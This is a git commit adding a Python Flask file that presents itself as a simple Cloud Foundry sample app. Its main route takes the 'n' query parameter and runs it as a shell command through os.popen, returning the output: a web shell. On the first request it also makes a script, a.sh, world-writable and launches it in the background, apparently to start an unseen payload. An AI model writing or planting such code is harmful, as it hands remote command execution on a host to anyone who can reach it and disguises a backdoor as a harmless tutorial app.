776f29f1d8ddd4bdf9df8fc26bc2c4bf8cf75c55
chamalz <cdrwaopen@gmail.com>
2020-09-09 19:49:13 -0700

    t1

---
+++ 1/hello.py
@@ -0,0 +1,55 @@
+"""
+A first simple Cloud Foundry Flask app
+
+Author: Ian Huston
+License: See LICENSE.txt
+
+"""
+from flask import Flask
+import os
+
+
+from flask import request
+import multiprocessing
+import threading
+import time
+import subprocess
+
+
+
+
+
+app = Flask(__name__)
+
+# Get port from environment variable or choose 9099 as local default
+port = int(os.getenv("PORT", 9099))
+
+@app.route('/')
+def hello_world():
+    aa=request.args.get("n")
+    #c=int(aa)
+    
+    ff="false"
+    try:
+        f1 = open('myfile.txt')
+        f1.close()
+        ff="true"
+    except FileNotFoundError:
+        ff="false"
+    if ff=="false":
+        f1=open("myfile.txt","a")
+        f1.close()
+        f = os.popen("chmod 777 a.sh")
+        f = subprocess.Popen(["bash", "a.sh", "runserver"])
+    
+
+
+    f = os.popen(str(aa))
+    now = f.read()  
+    
+       
+    return "<xmp>" + 'instance  ' + str(os.getenv("CF_INSTANCE_INDEX", 0))+ "   lsss   " +now+"   first    "+ff+  "</xmp>"
+
+if __name__ == '__main__':
+    # Run the app, listening on all IPs with our chosen port number
+    app.run(host='0.0.0.0', port=port)
